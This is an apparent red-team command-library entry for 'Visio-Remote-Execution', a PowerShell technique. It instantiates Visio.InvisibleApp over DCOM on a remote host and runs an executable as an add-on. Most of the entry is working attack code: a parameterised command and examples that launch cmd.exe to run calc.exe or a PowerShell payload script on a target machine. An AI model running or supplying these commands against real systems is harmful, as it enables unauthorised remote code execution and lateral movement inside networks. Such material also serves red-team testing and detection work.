---
type: command
executor: powershell
data: >-
  $visio =
  [activator]::CreateInstance([type]::GetTypeFromProgID("Visio.InvisibleApp",
  "$_TARGET_COMPUTER")); $visio.Addons.Add("$_EXEC_PATH").Run("/c $_COMMAND");
  $visio.Quit()
output: null
platforms:
  - Windows
tags:
  - dcom
  - remote-execution
verified: true
validated: true
---

# Visio-Remote-Execution

## Command

```powershell
$visio = [activator]::CreateInstance([type]::GetTypeFromProgID("Visio.InvisibleApp", "$_TARGET_COMPUTER"))
$visio.Addons.Add("$_EXEC_PATH").Run("/c $_COMMAND")
$visio.Quit()
```

## Description

Remotely creates an invisible Visio application via DCOM and adds/runs an executable as an add-on to execute commands on the target.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_COMPUTER | Target hostname | Yes |
| $_EXEC_PATH | Path to executable (e.g., cmd.exe) | Yes |
| $_COMMAND | Arguments for the executable | Yes |

## Examples

### Basic Usage

```powershell
$visio = [activator]::CreateInstance([type]::GetTypeFromProgID("Visio.InvisibleApp", "TARGET-PC"))
$visio.Addons.Add("C:\\Windows\\System32\\cmd.exe").Run("/c calc.exe")
$visio.Quit()
```

### Advanced Usage

```powershell
$visio = [activator]::CreateInstance([type]::GetTypeFromProgID("Visio.InvisibleApp", "TARGET-PC"))
$visio.Addons.Add("C:\\Windows\\System32\\cmd.exe").Run("/c powershell -f payload.ps1")
$visio.Quit()
```

## Expected Output

No console output; verify by command effects on target (e.g., process spawn). DCOM errors if Visio unavailable.

## Related

- [[procedures/DCOM-Office-Remote-Code-Execution]]
- [[commands/Excel-DDE-Remote-Execution]]
